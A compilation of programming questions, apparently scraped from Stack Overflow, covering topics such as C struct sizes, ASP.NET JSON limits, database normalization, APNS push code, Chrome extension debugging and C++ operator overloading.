    // Given this:
    struct { int values[20]; } foo;
    int values[20];

    // This may be true:
    sizeof(values) != sizeof(foo.values);
}
 I'm pretty certain that sizeof(values) will always equal sizeof(foo.values). However, I have not been able to find anything in the C standard (specifically C99) that explicitly confirms or denies this. Does anyone know if this rumor is addressed in any C standard? edit: I understand that there may be padding between the end of the array foo.values and the end of the struct foo and that the standard states that there will be no padding between the start of foo and the start of foo.values. However, does anyone have a quote from or reference to the standard where it says there is no padding between the elements of foo.values?
@CODE:{
    // Given this:
    struct { int values[20]; } foo;
    int values[20];

    // This may be true:
    sizeof(values) != sizeof(foo.values);
} sizeof(values) sizeof(foo.values) foo.values foo foo foo.values foo.values

@TITLE:JavaScriptSerializer.MaxJsonLength exceeded. What's the best practice for handling this?
@CONTENT:I've got a large amound of data I'm sending down to the client using jQuery's $.ajax() function. I'm calling a method in a ASP.NET web service that returns the JSON data. Everything is great for most searches, but when I've got a large data set to return I run into a issue with the JavaScriptSerializer MaxJsonLength property. What's the best practice for handling this? I don't want to just arbitrarily set a max length. Can I set the MaxJsonLength in the web service if the data being returned is larger than the current max or should I re-write and send down chucks of data to the client? Here's the relevant snippet from the web service: Dictionary<string, object> jsonValuePairs = new Dictionary<string, object>();
//add some data to the dictionary...
return System.Web.Script.Serialization.JavaScriptSerializer.Serialize(jsonValuePairs);
@CODE:Dictionary<string, object> jsonValuePairs = new Dictionary<string, object>();

@LINK:/questions/1023697/why-have-hashset-but-not-set-in-c
@TITLE:Why have HashSet but not Set in C#?
@CONTENT:Old question My understanding is that C# has in some sense HashSet and set types. I understand what HashSet is. But why set is a separate word? Why not every set is HashSet<Object>? New question Why does C# has no generic Set type, similar to Dictionary type? From my point of view, I would like to have a set with standard lookup/addition/deletion performance. I wouldn't care much whether it is realized with hashes or something else. So why not make a set class that would actually be implemented as a HashSet in this version of C# but perhaps somewhat different in a future version? Or why not at least interface ISet? Answer Learned thanks to everyone who answered below: ICollection implements a lot of what you'd expect from ISet. From my point of view, though, ICollection implements IEnumerable while sets don't have to be enumerable --- example: set of real numbers between 1 and 2 (even more, sets can be generated dynamically). I agree this is a minor rant, as 'normal programmers' rarely need uncountable sets. Ok, I think I get it. HashSet was absolutely meant to be called Set but the word Set is reserved in some sense. More specifically, creators of .NET architecture wanted to have a consistent set (sic!) of classes for different languages. This means that every name of the standard class must not coincide with any keyword in the .NET languages. The word Set, however, is used in VB.NET which is actually case-insensitive (is it?) so unfortunately there is no room for maneuvre there. Mystery solved :) Epilogue The new answer by Alex Y. links to the MSDN page which describes the upcoming .NET 4.0 interface ISet which behaves pretty much as I thought it should and is implemented by HashedSet. Happy end.

@TITLE:DB Design: 1st Normal Form and Repeating Groups
@CONTENT:To adhere to 1st normal form, one of the things you must avoid is repeating groups. As in instead of:     CustID  Name  Address       Phone1      Phone2       Phone3

     102    Jerry  234 East..   555-2342   555-9854     555-2986
 You should create a second Telephone Number table and then on a join you would get: CustID  Name     Address       Phone

102 Jerry    234 East..   555-2342
102 Jerry    234 East..   555-9854
102 Jerry    234 East..   555-2986
 Sometimes, it's a little more ambiguous and it's hard to tell when a group of column headers qualify. For instance, let's say you have, at the moment, two tests you run on every piece of hardware. And your first DB design yields the most horizontal approach: Design 1 SN     Test1_Max   Test1_Min    Test1_Mean  Test2_Max   Test2_Min    Test2_Mean
2093      23          2            15         54          -24           45
 Obviously, this is a repeating group, that could much more easily be represented as (on a join between "Parts" and "Tests"): Design 2 SN     Test      Max    Min    Mean     
2093    1        23     2      15       
2093    2        54     -24     45
 However, you could go even more vertical: Design 3 SN     Test    Statistic    Value
2093    1        Max          23
2093    1        Min          2
2093    1        Mean         15       
2093    2        Max          54
2093    2        Min         -24
2093    2        Mean         45
 Is Design 3 necessary? How do you decide how vertical to make it? What are the pros and cons between Design 2 and 3? It seems that both could be selected or joined easily with SQL, with the advantage given to Design 3 because you could easily add a new Statistic without actually modifying the table structure. But before anyone goes and says that the more vertical the better, there are times where it's more ambiguous. Like: Design 4 SN      AverageCurrent (mA)    BatteryCapacity (mA)  
2093          200                    540
 Could instead be: Design 5 SN      mA_Measuremnt       Value
2093    AverageCurrent      200 
2093    BatteryCapacity     540
 While both attributes are of the same domain (mA), they represent very different things in regards to the component. In this case, is Design 4 better since it's not strictly a repeating group? I guess what I'm looking for is some criteria to knowing when to break it down into more tables and thus make it more vertical. To sum up this ridiculously long question, should you only remove and normalize repeating groups if they are exacly the same domain and have the exact same meaning?. If that is the case, then really only the telephone example and probably the two tests in Design 1 meet this criteria. Though it seems like there might be design benefits to Design 3 and 5, even though the statistics of Design 3 have different meanings strictly speaking, and AverageCurrent and BatteryCapacity definitely have different meanings in Design 5.

@TITLE:Mime type for zip file in Google Chrome
@CONTENT:I discovered a weird issue in zip file's mime type when I worked on a Symfony application. According to w3school, the mime type for zip file is application/zip. This is what I believe, too. But when I upload a zip file in my Symfony app with IE, the mime type of that zip file is application/x-zip-compressed. When I upload a zip file in Firefox, the mime type of that zip file is application/octet-stream. None of them is application/zip as I would like to believe. The weirdest behavior of all, is Google Chrome. When I upload a zip file in Google Chrome, I can't determine the correct mime type for it. Although I am pretty sure that it's not application/zip   
application/x-zip
application/octet-stream
application/x-zip-compressed
 The mime type for zip file in Google Chrome is an empty string, as I found out by dumping out the sfValidatorFile object returned. Note the sfValidatorFile.type is "" for zip file. But the sfValidatorFile.type object returned for a jpeg file is jpeg. Seems to me like there is a bug in either Symfony or Google Chrome Futher info: It seems that Gmail interprets zip file's mime type as application/zip in Google Chrome. This is the correct behavior. Seems to confirm that it's Symfony's bug.

@TITLE:How do I make Windows file-locking more like UNIX file-locking?
@CONTENT:UNIX file-locking is dead-easy: The operating system assumes that you know what you are doing and lets you do what you want: For example, if you try to delete a file which another process has opened the operating system will usually let you do it. The original process still keeps it's file-handles until it terminates - at which point the the file-system will quietly re-cycle the disk-resources. No fuss, that's the way I like it. How different things are on Windows: If I try to delete a file which another process is using I get an Operating-System error. The file is untouchable until the original process releases it's lock on the file. That was great back in the single-user days of MS-DOS when any locking process was likely to be on the same computer that contained the files, however on a network it's a nightmare: Consider what happens when a process hangs while writing to a shared file on a Windows file-server. Before the file can be deleted we have to locate the computer and ID the process on that computer which originally opened the file. Only then can we kill the process and delete our unwanted file. What a nuisance! Is there a way to make this better? What I want is for file-locking on Windows to behave a like file-locking in UNIX. I want the operating system to just let me do what I want because I'm in charge and I know what I'm doing... ...so can it be done?

@TITLE:Given a list of variable names in Python, how do I a create a dictionary with the variable names as keys (to the variables' values)?
@CONTENT:I have a list of variable names, like this: ['foo', 'bar', 'baz']
 (I originally asked how I convert a list of variables. See Greg Hewgill's answer below.) How do I convert this to a dictionary where the keys are the variable names (as strings) and the values are the values of the variables? {'foo': foo, 'bar': bar, 'baz': baz}
 Now that I'm re-asking the question, I came up with: d = {}
for name in list_of_variable_names:
    d[name] = eval(name)
 Can that be improved upon? Update, responding to the question (in a comment) of why I'd want to do this: I often find myself using the % operator to strings with a dictionary of names and values to interpolate. Often the names in the string is just the names of local variables. So (with the answer below) I can do something like this: message = '''Name: %(name)s
ZIP: %(zip)s

Dear %(name)s,
...''' % dict((x, locals()[x]) for x in ['name', 'zip'])
@CODE:['foo', 'bar', 'baz'] {'foo': foo, 'bar': bar, 'baz': baz} d = {}
for name in list_of_variable_names:
    d[name] = eval(name) message = '''Name: %(name)s
ZIP: %(zip)s

Dear %(name)s,
...''' % dict((x, locals()[x]) for x in ['name', 'zip']) dict((x, locals()[...) vars()

@TITLE:System.Convert.ToInt vs (int)
@CONTENT:I noticed in another post, someone had done something like: double d = 3.1415;
int i = Convert.ToInt32(Math.Floor(d));
 Why did they use the convert function, rather than: double d = 3.1415;
int i = (int)d;
 which has an implicit floor and convert. Also, more concerning, I noticed in some production code I was reading: double d = 3.1415;
float f = Convert.ToSingle(d);
 Is that the same as: float f = (float)d;
 Are all those otherwise implicit conversions just in the Convert class for completeness, or do they serve a purpose? I can understand a need for .ToString(), but not the rest.
@CODE:double d = 3.1415;
int i = Convert.ToInt32(Math.Floor(d)); double d = 3.1415;
int i = (int)d; double d = 3.1415;
float f = Convert.ToSingle(d); float f = (float)d;

@CONTENT:This question is the other side of the question asking, "How do I calculate relative time?". Given some human input for a relative time, how can you parse it? By default you would offset from DateTime.Now(), but could optionally offset from another DateTime. (Prefer answers in C#) Example input: "in 20 minutes" "5 hours ago" "3h 2m" "next week" Edit: Let's suppose we can define some limits on the input. This sort of code would be a useful thing to have out on the web.

 I guess what I am trying to say is that it seems everything has to go into the root of the views/controllers folders which could get unwieldy when working on a project that if built with web forms might have lots and lots of folders and sub-folders to partition the application. I think I get the MVC model and I like the look of it compared to web forms but still getting my head round how you would build a large project in practice.

 Some structures have bool members. So if I have one of these structures defined as local variables within a C++ function and pass it to a C function the sizes are inconsistent between C++ and C as bool is one bye in C++ and 4 in C. Does anyone have any advice to how to overcome this without resorting to my current solution which is //#define bool _Bool
#define bool unsigned char
 Which is against the C99 standard for stdbool.h

@CONTENT:I am looking for a tool that can detect malicious requests (such as obvious SQL injection gets or posts) and will immediately ban the IP address of the requester/add to a blacklist. I am aware that in an ideal world our code should be able to handle such requests and treat them accordingly, but there is a lot of value in such a tool even when the site is safe from these kinds of attacks, as it can lead to saving bandwidth, preventing bloat of analytics, etc. Ideally, I'm looking for a cross-platform (LAMP/.NET) solution that sits at a higher level than the technology stack; perhaps at the web-server or hardware level. I'm not sure if this exists, though. Either way, I'd like to hear the community's feedback so that I can see what my options might be with regard to implementation and approach.

@TITLE:Does C++11 allow dollar signs in identifiers?
@CONTENT:Are dollar-signs allowed in identifiers in C++03? covers that dollar signs in identifiers are not allowed in C++03. GCC provides it as a C extension and properly gives a diagnostic in C++03 mode. However, in C++11, int $ = 0 will compile without warning. This answer reasons that $ may be allowed because no diagnostic is required for implementation defined identifiers: The answer here is "Maybe": According to ¡±2.11, identifiers may consist of digits and identifier-nondigits, starting with one of the latter. identifier-nondigits are the usual a-z, A-Z and underscore, in addition since C++11 they include universal-character-names (e.g. \uBEAF, \UC0FFEE32), and other implementation-defined characters. So it is implementation defined if using $ in an identifier is allowed. VC10 and up supports that, maybe earlier versions, too. It even supports identifiers like ?????. But: I wouldn't use them. Make identifiers as readable and portable as possible. $ is implementation defined and thus not portable. This language is present in the C++03 standard as well, so I don't find this to be a very convincing argument. ¡±2.10/2 In addition, some identifiers are reserved for use by C ++ implementations and standard libraries (17.6.4.3.2) and shall not be used otherwise; no diagnostic is required. What change in the standard allows $ to be used as an identifier name?
@CODE:int $ = 0 $ a-z A-Z \uBEAF \UC0FFEE32 $ ????? $ $ $ Accept ¡¥$¡¦ in identifiers.

@CONTENT:Soooooo isNaN is apparently broken in JavaScript, with things like: isNaN('')
isNaN('   ')
isNaN(true)
isNaN(false)
isNaN([0])
 Returning false, when they appear to all be... Not a Number... In ECMAScript 6, the draft includes a new Number.isNaN but it looks like (imo) that this is also broken... I would expect Number.isNaN('RAWRRR')
 To return true, since it's a string, and cannot be converted to a number... However... It seems that things that I would consider... not a number, are indeed, not, not a number... http://people.mozilla.org/~jorendorff/es6-draft.html#sec-isfinite-number The examples on MDN say: Number.isNaN("blabla"); // e.g. this would have been true with isNaN I don't understand how this is "More robust version of the original global isNaN." when I cannot check to see if things are not a number. This would mean we're still subjected to doing actual type checking as well as checking isNaN... which seems silly... http://people.mozilla.org/~jorendorff/es6-draft.html#sec-isnan-number The ES3 draft here basically says, everything is always false, except with its Number.NaN Does anyone else find this is broken or am I just not understanding the point of isNaN?

@TITLE:Are Swift ¡§mutable¡¨ strings really mutable, or are they just like Java strings?
@CONTENT:In The Swift Programming Language, in the section on Strings, subsection String Mutability, it says this: You indicate whether a particular String can be modified (or mutated) by assigning it to a variable (in which case it can be modified), or to a constant (in which case it cannot be modified): and gives example code: var variableString = "Horse"
variableString += " and carriage"
// variableString is now "Horse and carriage"

let constantString = "Highlander"
constantString += " and another Highlander"
// this reports a compile-time error - a constant string cannot be modified¡¨
 The book in iBooks here, or in a web browser here. In the next paragraph it claims that "strings are value types". My question: that doesn't look like a mutable string to me. It looks like what I'm used to in Java (or C#, Python, and others): immutable string objects with mutable variable bindings. In other words, there was an object "Horse" and then it created a new String object "Horse and carriage" and set it to the same variable. And since there is no way to tell the difference between an reference to an immutable object versus a value type (right?), I wonder: why are they describing it like this? Is there any difference between these Swift strings and the way it is in Java? (Or C#, Python, Objective-C/NSString)
@CODE:String var variableString = "Horse"
variableString += " and carriage"
// variableString is now "Horse and carriage"

let constantString = "Highlander"
constantString += " and another Highlander"
// this reports a compile-time error - a constant string cannot be modified¡¨

@LINK:/questions/22817806/best-practice-when-working-with-sparse-matrices
@TITLE:Best practice when working with sparse matrices
@CONTENT:This question is based on a discussion in this question. I have been working with sparse matrices earlier and my belief is that the way I've been working with these is efficient. My question is twofold: In the below, A = full(S) where S is a sparse matrix. What's the "correct" way to access an element in a sparse matrix? That is, what would the sparse equivalent to var = A(row, col) be? My view on this topic: You wouldn't do anything different. var = S(row, col) is as efficient as it gets. I have been challenged on this with the explanation: Accessing element on row 2 and column 2 the way you said, S(2,2) does the same as adding a new element: var = S(2,2) => A = full(S) => var = A(2,2) => S = sparse(A) => 4. Can this statement really be correct? What's the "correct" way to add elements to a sparse matrix? That is, what would the sparse equivalent of A(row, col) = var be? (Assuming A(row, col) == 0 to begin with) It is known that simply doing A(row, col) = var is slow for large sparse matrices. From the documentation: If you wanted to change a value in this matrix, you might be tempted to use the same indexing: B(3,1) = 42; % This code does work, however, it is slow. My view on this topic: When working with sparse matrices, you often start with the vectors and use them to create the matrix this way: S = sparse(i,j,s,m,n). Of course, you could also have created it like this: S = sparse(A) or sprand(m,n,density) or something similar. If you start of the first way, you would simply do: i = [i; new_i];
j = [j; new_j];
s = [s; new_s];
S = sparse(i,j,s,m,n); 
 If you started out not having the vectors, you would do the same thing, but use find first: [i, j, s] = find(S);
i = [i; new_i];
j = [j; new_j];
s = [s; new_s];
S = sparse(i,j,s,m,n); 
 Now you would of course have the vectors, and can reuse them if you're doing this operation several times. It would however be better to add all new elements at once, and not do the above in a loop, because growing vectors are slow. In this case, new_i, new_j and new_s will be vectors corresponding to the new elements.
@CODE:A = full(S) S var = A(row, col) var = S(row, col) var = S(2,2) A = full(S) var = A(2,2) S = sparse(A) => 4 A(row, col) = var A(row, col) == 0 A(row, col) = var S = sparse(i,j,s,m,n) S = sparse(A) sprand(m,n,density) i = [i; new_i];
j = [j; new_j];
s = [s; new_s];
S = sparse(i,j,s,m,n); find [i, j, s] = find(S);
i = [i; new_i];
j = [j; new_j];
s = [s; new_s];
S = sparse(i,j,s,m,n); new_i new_j new_s

@TITLE:APNS Push Notifications Not Working on Production
@CONTENT:I created an App to send remote notifications from a web server. When I tested the App in Development Mode all the notifications arrived correctly on the phone, after the AppStore release the app did not receive notifications anymore. Here it is what I did: Created a Private Key For Production and one for development. Generated on my App ID two SSL Certificates by passing the previous CertFile Generated. I'm 100% sure to have generated correctly 2 key and passed them correctly to download the SSL Cert from Dev Center under AppID. Created a file .pem for development and one for production (by converting the file .p12 extracted from my KeyChain etc etc). Created 2 different provisioning profile one for development and one for production connected to the AppID of step 1. Signed the app in Build Settings with the correct Provisioning Profiles created in step 4. Created a Web App to catch and store users Tokens. Created a php page to test Push Notification Sending. Here it is what i tested: Tested the development generated .pem file with telnet on sandbox link with a succesfull answer. Tested the production generated .pem file with telnet on production link with a succesfull answer. I'm 100% sure to have stored on my web app the development token of my iPhone. I'm 100% sure to have stored on my web app server the production token of my iPhone. I'm 100% sure to pass with my php page the right message to Apple Server (both for development and production). The php page always return a succesfull message from Apple Server (both for development and production). Here is how I sign the app on Xcode: Here is the code of the php page to send notifications:     $ctx = stream_context_create();

    //stream_context_set_option($ctx, 'ssl', 'passphrase', 'development_pwd');
    //stream_context_set_option($ctx, 'ssl', 'local_cert', 'ck_development.pem');
    //$fp = stream_socket_client('ssl://gateway.sandbox.push.apple.com:2195', $err, $errstr, 60, STREAM_CLIENT_CONNECT|STREAM_CLIENT_PERSISTENT, $ctx); //test

    stream_context_set_option($ctx, 'ssl', 'passphrase', 'production_pwd');
    stream_context_set_option($ctx, 'ssl', 'local_cert', 'ck_production.pem');
    $fp = stream_socket_client('ssl://gateway.push.apple.com:2195', $err, $errstr, 60, STREAM_CLIENT_CONNECT|STREAM_CLIENT_PERSISTENT, $ctx); //production

    if(!$fp){
        echo "<p>Failed to connect!<br />Error Number: " . $err . " <br />Code: " . $errstrn . "</p>";
        return;
    } else {
        echo "<p>Sending notification!</p>";    
    }

    $i = 0;

    foreach ($deviceToken as $dt) {
        $dt = str_replace(' ' , '' , $dt);
        $msg = chr(0) . pack('n',32) . pack('H*', $dt) . pack('n',strlen($payload)) . $payload;
        echo "<p>" . $i . " - Message sent: " . $payload . "<br />Token: ". $dt . "<br />***" . $msg . "***</p>";
        $result = fwrite($fp, $msg, strlen($msg));
        $i++;
        if (!$result)
            echo '<p>Message not delivered ' . PHP_EOL . '!</p>';
        else
            echo '<p>Message successfully delivered ' . PHP_EOL . '!</p>';
    }
    fclose($fp);
    echo "<p>Total Notifications Sent: " . $i . "</p>";
    echo "<p>Connection Closed!</p>";
}

 Conclusions: I have the Test App on my PC that receive APNS Push Notifications. I have the exactly same app released on App Store that not receive APNS Push Notifications. I realy made everything in my power to fix this issue and read about thousand pages of forums, stackoverflow and Apple Documentations. I'm willing to retribuite everyone of you who helps me find the solution to my issue!

@TITLE:Why is the window.width smaller than the viewport width set in media queries
@CONTENT:I am quite puzzled and still unsure how to explain this in proper words. So far i've used and set up my media queries with Breakpoint. An used Breakpoint-variable looks like e.g.: $menustatictofixed: min-width 900px;
 $breakpoint-to-ems is set to true. I've laid out the page with all its Breakpoint variables based on the pixel values of the following jQuery snippet: $('body').append('<div style="position: fixed; bottom: 0; right: 0; display: inline-block; font-weight: bold; padding: 5px 7px; border-radius: 5px 0 0 0; background: green; color: white; z-index: 9999;">Viewport width <span id="width"></span> px</div>');
var viewportWidth = $(window).width()
$('#width').text(viewportWidth);
$(window).resize(function() {
  var viewportWidth = $(window).width();
    $('#width').text(viewportWidth);
});
 Everything looked proper and clean. But over the last one or two days i had issues setting up the last breakpoints for a pattern and to get things behave predictable. Somehow the things that appeared to add up clean and fine in the first place, which i logically highly doubt now, are in fact improper and somehow a mess. Cuz if you take a look at the following screenshot somehow the width of the window (in Chrome) differs to the width from the jQuery snippet utilising window.width. There isn't also a difference if i would replace window.width by window.innerWidth to rule out scrollbars eventually. The only way to receive proper results is by adding 15 pixels to the equation: var viewportWidth = $(window).width() + 15;
 Is the only issue in the whole equation that window.width is the wrong choice of function and it would be better to go with e.g. document.documentElement.clientWidth or something else or ... ? And for what the 15 pixels are standing for which fixed the problem above in a bit hacky way? Best regards Ralf

@TITLE:Debugging Content Scripts for Chrome Extension
@CONTENT:General Questions Hello! I'm delving into the world of Chrome Extensions and am having some problems getting the overall workflow down. It seems that Google has recently switched to heavily advocating Event Pages instead of keeping everything in background.js and background.html. I take part of this to mean that we should pass off most of your extension logic to a content script. In Google's Event Page primer, they have the content script listed in the manifest.json file. But in their event page example extension, it is brought in via this code block in background.js: chrome.tabs.executeScript(tab.id, {file: "content.js"}, function() { }); What are the advantages of doing it one way over the other? My Code I'm going forward with the programatic way of injecting the content script, like Google's example. manifest.json {
    "manifest_version": 2,
    "name": "Test",
    "description": "Let's get this sucker working",
    "version": "0.0.0.1",
    "permissions": [
        "tabs",
        "*://*/*"
    ],
    "background": {
        "scripts": ["background.js"],
        "persistent": false
    },
    "browser_action": {
        "default_icon": "icon.png"
    }
}
 background.js chrome.browserAction.onClicked.addListener(function() {
    console.log("alert from background.js");
    chrome.tabs.executeScript({file: "jquery-2.0.2.min.js"}, function() {
        console.log("jquery Loaded");
    });
    chrome.tabs.executeScript({file: "content.js"}, function() {
        console.log("content loaded");
    });
});
 content.js console.log('you\'r in the world of content.js');
var ans = {};

ans.createSidebar = function() {

    return {
        init: function(){
            alert("why hello there");
        }
    }
}();

ans.createSidebar.init();
 I am able to get the first 3 console.log statements to show up in the background page's debugger. I'm also able to get the alert from content.js to show up in any website. But I'm not able to see the console.log from content.js, nor am I able to view any of the JS from content.js. I've tried looking in the "content scripts" section of the background page debugger's Sources tab. A few other posts on SO have suggested adding debugger; statements to get it to show, but I'm not having any luck with anything. The closest solution I've seen is this post, but is done by listing the content script in the manifest. Any help would be appreciated. Thanks!
@CODE:chrome.tabs.executeScript(tab.id, {file: "content.js"}, function() { }); {
    "manifest_version": 2,
    "name": "Test",
    "description": "Let's get this sucker working",

@TITLE:Any risk in a AutoCloseable wrapper for java.util.concurrent.locks.Lock?
@CONTENT:With try-with-resource introduced in Java 7, I was surprised to see that that the Lock has not been retrofitted to be an AutoCloseable. It seemed fairly simple, so I have added it myself as follows: class Lock implements AutoCloseable {
    private final java.util.concurrent.locks.Lock _lock;
    Lock(java.util.concurrent.locks.Lock lock) {
        _lock = lock;
        _lock.lock();
    }
    @Override 
    public void close() {
        _lock.unlock();
    }
}
 This works with an AutoCloseableReentrantReadWiteLock class and usage is as follows: try (AutoCloseableReentrantReadWiteLock.Lock l = _lock.writeLock()) {
    // do something
}        
 Since this seems so straightforward and canonical use of auto-closing RAII I am thinking there must be a good reason this should not be done. Anybody know?
@CODE:try-with-resource Lock AutoCloseable class Lock implements AutoCloseable {
    private final java.util.concurrent.locks.Lock _lock;
    Lock(java.util.concurrent.locks.Lock lock) {
        _lock = lock;
        _lock.lock();
    }
    @Override 
    public void close() {
        _lock.unlock();
    }
} AutoCloseableReentrantReadWiteLock try (AutoCloseableReentrantReadWiteLock.Lock l = _lock.writeLock()) {

@TITLE:Gradle multiproject gives ¡§Could not find property 'sourceSets' on project¡¨ error
@CONTENT:I had quite good gradle configuration, that built everything just fine. But one of the projects of my multi-project build derived from the rest of them so much, that I would gladly move it to another git repo and configure submodules to handle it. First, I moved Project and its resources to subfolder Libraries/MovedProject. After altering some lines in gradle configurations it worked fine. But then I decided to write a new build.gradle just for this project, and move all configurations there from the main one. And this is where everything stopped working. When I try to call any task it always ends with Could not find property 'sourceSets' on project ':Libraries/MovedProject'. Line which is responsible for it is: dependencies {
    ...
    if (noEclipseTask) {
        testCompile project(':Libraries/MovedLibrary').sourceSets.test.output
    }
}
 which I use for running tests in which I use classes from other projects. If I remove that line, the build fails only when it reaches compileTestJava task of projects that make use of MovedProject. If I remove that line and call gradle :Libraries/MovedLibrary:properties I can see : ...
sourceCompatibility: 1.7
sourceSets: [source set main, source set test]
standardOutputCapture: org.gradle.logging.internal.DefaultLoggingManager@1e263938
...  
 while gradle :Libraries/MovedLibrary:build builds correctly. Currently I've got everything set up as following: directories: /SomeMainProject1 /SomeMainProject2 /SomeMainProject3 /Libraries /MovedProject build.gradle dependencies.gradle project.gradle tasks.gradle /Builder dependencies.gradle project.gradle tasks.gradle build.gradle settings.gradle settings.gradle include Libraries/MovedProject,
        SomeMainProject1,
        SomeMainProject2,
        SomeMainProject3
 sourceSets for MovedProject are defined in Libraries/MovedProject/project.gradle: sourceSets {
    main {
        java {
            srcDir 'src'
            srcDir 'resources'
        }
        resources { srcDir 'resources' }
    }
    test { java {
        srcDir 'test/unit'
    } }
}
 dependencies that makes use of sourceSets.test.output are stored in Builder/dependancies.gradle, and set for each project that needs MovedProject to run tests: project(':SomeMainProject1') {
    dependencies {
        ...

        if (noEclipseTask) {
            testCompile project(':Libraries/net.jsdpu').sourceSets.test.output
        }
    }
}
 What would be the easiest way to get rid of that error and make gradle build projects with current directory structure? I would like to understand why gradle cannot see that property.

@TITLE:C++: overloading ++ for both pre and post increment
@CONTENT:Can we overload operator++ for pre-increment and post-increment? i.e. calling SampleObject++ and ++SampleObject results correctly. class CSample {
 public:
   int m_iValue;     // just to directly fetch inside main()
   CSample() : m_iValue(0) {}
   CSample(int val) : m_iValue(val) {}
   // Overloading ++ for Pre-Increment
   int /*CSample& */ operator++() { // can also adopt to return CSample&
      ++(*this).m_iValue;
      return m_iValue; /*(*this); */
   }

  // Overloading ++ for Post-Increment
 /* int operator++() {
        CSample temp = *this;
        ++(*this).m_iValue;
        return temp.m_iValue; /* temp; */
    } */
};
 We can't overload a function based only on return type, and also even if we take it as permitted, it doesn't solve the problem because of the ambiguity in call resolution. Since operator overloading is provided to make built-in types behave like as user-defined types, why we can't avail both pre and post increment for our own types at the same time.
@CODE:operator++ SampleObject++ ++SampleObject class CSample {
 public:
   int m_iValue;     // just to directly fetch inside main()
   CSample() : m_iValue(0) {}
   CSample(int val) : m_iValue(val) {}
   // Overloading ++ for Pre-Increment
   int /*CSample& */ operator++() { // can also adopt to return CSample&
      ++(*this).m_iValue;

@LINK:/questions/15231407/segfault-in-r-using-reshape2-package-and-dcast
@TITLE:segfault in R using reshape2 package and dcast
@CONTENT:RStudio was crashing when I tried to reshape a particular data frame using dcast (from the reshape2 package). I discovered that the crash was actually happening in R itself, so I ran my casting code in R.app and got the type of error that gives this site its name: Error: segfault from C stack overflow. With the help of Google and SO, I learned that this is a memory access error. Okay, I got that far, but I don't know where to go from here. I can't provide a true reproducible example, because my data frame is about 558,000 rows and the problem doesn't occur on small toy examples. For example, even if I take, say, a 50,000-row subset of the data, dcast works just fine. Could there be a particular row of data that's causing a problem? If so, can anyone suggest what feature(s) to look for that could be causing the type of error I'm getting? Here is a subset of the data frame I'm casting from (with fake values for some variables), followed by the casting function I'm using. I've also included this small snippet of data in a dput function below, in case it would be helpful to play around with it. The real data set has about 700 values of prog, 15 values of prog1, and 5 values of fa.type.   id        term   yr    nslds acad.lev    prog            prog1 fa.type amount

@TITLE:Class extending more than one class Java?
@CONTENT:I know that a class can implement more than one interface, but is it possible to extend more than one class? For example I want my class to extend both TransformGroup and a class I created. Is this possible in Java? Both statements class X extends TransformGroup extends Y and class X extends TransformGroup, Y receive an error. And if it is not possible, why? TransformGroup extends Group but I guess it also extends Node since it inherits fields from Node and it can be passed where a Node object is required. Also, like all classes in Java, they extend Object class. So why wouldn't it be possible to extend with more than one class? TransformGroup inheritance So, if that is possible, what is the proper way to do it? And if not, why and how should I solve the problem?

b = np.random.randint(0, 10, (2, 5,5))

 Does anyone have an idea? Of course I can always introduce an additional variable, but I was wondering whether there was a more elegant way of doing this.

@LINK:/questions/14865919/wheres-the-proper-resource-handling-rule-of-zero
@TITLE:Where's the proper (resource handling) Rule of Zero? [closed]
@CONTENT:Here's an article that talks about an idiom named Rule of Zero. Here's an excerpt: class module {
public:
    explicit module(std::wstring const& name)
    : handle { ::LoadLibrary(name.c_str()), &::FreeLibrary } {}

    // other module related functions go here

private:
    using module_handle = std::unique_ptr<void, decltype(&::FreeLibrary)>;

    module_handle handle;
};
 It reuses unique_ptr RAII features so you don't need to care about implementing a daunting and verbose Rule of Five wrapper. Presented this way (managing handle based resources with unique_ptr, that way), it looks as a hack for me, not a best solution for what it's trying to solve. Too many assumptions are being implicitly assumed: One is able to peer and use the basic type the #define (or typedef) HANDLE is built upon. For me this should be hidden knowledge, and a solution be based exclusively on what the interface makes available: HANDLE. Handles, can be anything, they're not required to be pointer types. I'd like to use this idiom, but it falls short in many situations I stumble upon. Is this handle focused RAII wrapper already done and usable in some cool library? Is everybody using such a tool and I'm not aware? (I think it nice to have such tooling not only for one, but for the many types of ownerships that are) EDIT 1 This is not about platform specific resource handles, e.g., glGenLists returns a kind of handle, it's a GLuint, and you should call glDeleteLists on it. As already stated, resource handles are not required to be pointer types, and this assumption should not be assumed. EDIT 2 Rule of Zero, in the former sample, by employing an already existing tool, unique_ptr, shows as a nice shortcut for handle management. The extra assumptions that it requires makes it falls short. The right assumptions are that you have a handle and you have a resource destroying function that destroys the resource given by the handle. Whether the handle is a void *, a GLuint, whatever, it should not matter, and worse, one should not even be required to peer HANDLE inner type. For the purpose of managing handles RAII way, if the idiom tells it's good for that, and can't apply in such situations, I feel it's not good for that, at last with the given tool. EDIT 3 An illustrative situation would be, let's say you're in charge of using a fresh 3rd party C library. It contains a FooHandle create_foo() and a void destroy_foo(FooHandle). So you think, "let's use FooHandle's by employing the Rule of Zero". Ok, you go by using a unique_ptr, a unique_ptr to what you ask yourself? Is FooHandle a pointer?, so that you use a unique_ptr to FooHandle's not exposed basic type? Is it an int?, so that you may use it straight, or is it better to (re)typedef things like @NicolBolas has done in his answer. For me, it seems clear, even in such a trivial situation, unique_ptr is already showing as not an ideal fit for managing resource handles. Disclaimer: I've tried to reformulate and better express myself in: Is there a proper 'ownership-in-a-package' for 'handles' available? EDIT 4 I've found what I was looking for, I've put it as an answer in the reformulated question: http://stackoverflow.com/a/14902921.

@TITLE:How is the size of a variable length array computed at runtime in C99?
@CONTENT:In C89, the length of an array is known at compile time. But in C99, with variable length arrays, the length of an array may be unknown before runtime. So how does it get computed? And why couldn't the length of a dynamically allocated array be computed in the same way?

@TITLE:Access parent's overriden method from parent's context in PHP
@CONTENT:I have a drawing PHP class called ClassA that is extended by many other drawing classes, ClassB for instance. I need the inherited classes to fire its parent classes' Draw() method. However, in my particular situation, I do not want to call such method directly (e.g.: parent::Draw()). I'd like a third function (e.g.: parent::InvokeDraw()) to call my drawing method from within the parent's context. Here's some code to illustrate: class ClassA
{
    function Draw()
    {

        /* Drawing code ... */

    }

    function InvokeDraw()
    {
        $this->Draw();
    }
}

class ClassB extends ClassA
{
    function Draw()
    {
        parent::InvokeDraw();

        /* Drawing code ... */

    }
}
 The problem I'm facing is that InvokeDraw() will not call the parent's Draw() method, but rather the extended class' own Draw() method, thus causing an infinite loop. Although the issue is fairly logical, I am having a hard time figuring out a workaround on that. How to accomplish this task? Desired effect Infinite loop problem
@CODE:parent::Draw() parent::InvokeDraw() class ClassA
{
    function Draw()
    {

        /* Drawing code ... */

    }

    function InvokeDraw()
    {
        $this->Draw();
    }
}

